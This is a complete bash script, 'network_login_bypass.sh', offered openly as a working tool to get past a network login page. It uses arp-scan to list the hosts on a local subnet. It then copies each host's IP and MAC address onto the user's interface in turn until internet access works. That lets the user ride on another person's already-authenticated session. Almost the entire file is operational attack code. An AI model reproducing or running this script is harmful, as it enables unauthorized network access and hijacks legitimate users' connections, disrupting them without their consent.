#!/bin/bash
#
# Copyright (C) 2016 MasterOfD3c0d3 <masterofdecode@gmail.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# ------------------------------------------------------------------
#
# network_login_bypass.sh - Search for an authenticated machine in a
# network with login request, so its IP and MAC address are cloned.
# 
# ------------------------------------------------------------------
# This script receives the user connected interface and an IP range
# from the network as parameters, so it clones each IP address from
# range and checks the connectivity, if an IP responds to ping, it
# stops and your new status on the network are shown.
#
# Examples:
#	$ ./network_login_bypass.sh -i wlan0 -r 10.15.16.0/30
#	BYPASS LOGIN REQUEST FROM NETWORK
#	---------------------------------
#
#	Running!
#
#	Please, wait...
#
# The order of the IP connectivity checks are sequential
# ------------------------------------------------------
# 
# 
# Changelog:
#
#	v0.1 Apr/2016
#		- Initial version, just testing the script
#	v0.2 Apr/2016
#		- Added a root and internet connection check before running
#	v0.3 May/2016
#		- Added the options (-h, -V)
#	v0.4 May/2016
#		- Added the options (-i, -r)
#		- Added a validation for interface and range
#
#
# License: GNU General Public License v3.0
# -----------------------------------------------------------------
#
#SCRIPT OPTIONS
USAGE_MSG="
Usage: $(basename "$0") [OPTIONS] [VALUE]

	-h, --help		Display this help message
	-V, --version		Display the script version
	-i, --interface 	Set the connected interface
	-r, --range		Set an IP range from network
"
#SCRIPT TITLE
title="\033[33;1mBYPASS LOGIN REQUEST FROM NETWORK"
div="---------------------------------\033[m"
#OPTIONS VALIDATION
while test -n "$1"
do
	case "$1" in
		-h | --help)
			echo "$USAGE_MSG"
			exit 0
		;;
		
		-V | --version)
			echo -n $(basename "$0")
			grep -P "^#\tv" "$0" | tail -1 | cut -d " " -f 1 | tr -s '#\t' ' '
			exit 0
			
			# If a new version will be released, just add it on the header
			# following the pattern. The code above will take the new version
			# automatically.
		;;
		
		-i | --interface)
			shift
			interface="$1"
			
			if test -z "$interface"
			then
				echo -n $(basename "$0")
				echo ": Missing value for -i"
				exit 1
			fi
			
			#CHECKING IF INTERFACE EXISTS ON THE COMPUTER
			found=`grep "$interface" /proc/net/dev`
			if [ ! -n "$found" ]; then
			   clear
			   echo -e $title
			   echo -e $div
			   echo
			   echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
			   read
			   exit 1
			fi

			#CHECKING IF INTERFACE IS CONNECTED
			inet=`ifconfig "$interface" | grep "inet addr"`
			if [ -z "$inet" ]; then
			   clear
			   echo -e $title
			   echo -e $div
			   echo
			   echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
			   read
			   exit 1
			fi
		;;
		
		-r | --range)
			shift
			range="$1"
			
			if test -z "$range"
			then
				echo -n $(basename "$0")
				echo ": Missing value for -r"
				exit 1
			fi
		;;
		
		*)
			if test -n "$1"
			then
				echo -n $(basename "$0")
				echo ": Invalid option: $1"
				exit 1
			fi
		;;
	esac
	
	shift
done
#CHECKING ROOT ACCESS
if [[ $EUID -ne 0 ]]; then
   echo -n $(basename "$0")
   echo -e ": This script $(basename "$0") needs root access!"
   exit 1
fi
#CHECKING IF IT'S ALREADY CONNECTED TO THE INTERNET
result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
if [ -n "$result" ]; then
   clear
   echo -e $title
   echo -e $div
   echo
   echo -e "\033[31;1mScript was not run. \033[32;1mYou're already connected to the internet!\033[m"
   read
   exit 0
fi
#CHECKING IF INTERFACE VALUE WAS SET IN OPTIONS
if [ -z "$interface" ]; then
	clear
	echo -e $title
	echo -e $div
	echo
	echo "Type your network interface:"
	echo "Example: wlan0"
	echo
	read interface
	#CHECKING EMPTY INTERFACE VALUE
	if [ "$interface" = "" ]; then
	   clear
	   echo -e $title
	   echo -e $div
	   echo
	   echo -e "\033[31;1mNo interface was informed, insert an interface correctly!\033[m"
	   read
	   exit 1
	fi
	#CHECKING IF INTERFACE EXISTS ON THE COMPUTER
	found=`grep "$interface" /proc/net/dev`
	if [ ! -n "$found" ]; then
	   clear
	   echo -e $title
	   echo -e $div
	   echo
	   echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
	   read
	   exit 1
	fi
	#CHECKING IF INTERFACE IS CONNECTED
	inet=`ifconfig "$interface" | grep "inet addr"`
	if [ -z "$inet" ]; then
	   clear
	   echo -e $title
	   echo -e $div
	   echo
	   echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
	   read
	   exit 1
	fi
fi
#CHECKING IF RANGE VALUE WAS SET IN OPTIONS
if [ -z "$range" ]; then
	clear
	echo -e $title
	echo -e $div
	echo
	echo "Type an IP range from network:"
	echo "Example: 10.15.16.0/30"
	echo
	read range
	#CHECKING EMPTY RANGE VALUE
	if [ "$range" = "" ]; then
	   clear
	   echo -e $title
	   echo -e $div
	   echo
	   echo -e "\033[31;1mNo range was informed, insert a range correctly!\033[m"
	   read
	   exit 1
	fi
fi
#GETTING NETWORK GATEWAY
gateway=`route -n | grep --color UG | cut -d " " -f 10`
#GENERATING A CONNECTED IP AND MAC ADDRESS LIST
arp-scan -I $interface $range | grep -v Interface | grep -v Starting | grep -v received | grep -v Ending | cut -f 1,2 > tempList_network_login_bypass.txt
clear
echo -e $title
echo -e $div
echo
echo "Running!"
echo
echo "Please, wait..."
echo
#CHECKING EACH IP AND MAC FROM THE LIST
while read line; do
   ip=$( echo "$line" | cut -f 1 )
   mac=$( echo "$line" | cut -f 2 )
   ifconfig $interface down
   ifconfig $interface hw ether $mac
   ifconfig $interface $ip
   ifconfig $interface up
   route add default gw $gateway
   #CHECKING CONNECTIVITY
   sleep 5
   result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
   if [ -n "$result" ]; then
	  #REMOVING THE CONNECTED IP AND MAC ADDRESS LIST
      file="tempList_network_login_bypass.txt"
      if [ -f $file ]; then
         rm $file
      fi
      clear
      echo -e $title
      echo -e $div
      echo
      echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
	  echo
	  echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
      read
      exit 0
   fi
done <tempList_network_login_bypass.txt
#REMOVING THE CONNECTED IP AND MAC ADDRESS LIST
file="tempList_network_login_bypass.txt"
if [ -f $file ]; then
   rm $file
fi
#MAKING A LAST CONNECTIVITY CHECK
sleep 5
result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
if [ -n "$result" ]; then
   clear
   echo -e $title
   echo -e $div
   echo
   echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
   echo
   echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
   read
   exit 0
else
   clear
   echo -e $title
   echo -e $div
   echo
   echo -e "\033[31;1mSorry, but it was not possible to bypass login request.\033[m"
   echo
   exit 1
fi
